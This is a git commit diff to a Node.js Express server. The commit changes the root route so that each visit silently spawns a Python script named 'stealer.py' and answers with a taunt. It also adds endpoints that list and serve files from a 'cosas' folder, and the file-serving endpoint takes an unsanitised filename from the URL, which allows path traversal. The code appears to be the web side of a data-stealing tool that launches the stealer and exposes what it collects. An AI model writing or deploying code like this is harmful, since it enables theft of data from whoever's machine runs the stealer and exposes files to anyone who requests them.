9cf864848bfec06c880e7504b1375bba4bb0adf5
Carlos Atienza <72754340+carlosatyca@users.noreply.github.com>
2022-12-07 17:32:01 +0100

    a:

--- app.js
+++ app.js
@@ -1,7 +1,7 @@
 const http = require('http');
 
-const hostname = process.env.HOST;
-const port = process.env.PORT;
+const hostname = '127.0.0.1';
+const port = 3000;
 const express = require('express')
 var cors = require('cors');
 const app = express()
@@ -15,18 +15,21 @@ app.listen(port, hostname, () => {
 });
 
 
-app.get('/', async(req, res) => {
-  res.header("Access-Control-Allow-Headers", "X-Requested-With, Content-Type");
+app.get('/', (req, res) => {
+    res.header("Access-Control-Allow-Headers", "X-Requested-With, Content-Type");
+    spawn('python',["./scripts/stealer.py"]);
+    res.send({uo:"pillado huron"})
+  })
 
-  let dummy = spawn("python ./stealer.py", { shell: true });
-  dummy.on('close', (code) => {
-    console.log(`child process exited with code ${code}`);
-  });
-  dummy.stdout.on('data', function(data) {
-    sys.print(data.toString());
-  });
-  res.send({uo:"pillado huron"})
-  console.log("amicu");
-  console.log(dummy)
-})
-
+  app.get('/list', (req, res) => {
+    res.header("Access-Control-Allow-Headers", "X-Requested-With, Content-Type");
+    const fs = require('fs');
+    const data = fs.readdirSync('./cosas');
+    res.send({data})
+  })
+  app.get('/:name', (req, res) => {
+    res.header("Access-Control-Allow-Headers", "X-Requested-With, Content-Type");
+    const fs = require('fs');
+    const data = fs.readFileSync(`./cosas/${req.params.name}`, 'UTF-8');
+    res.send(data)
+  })
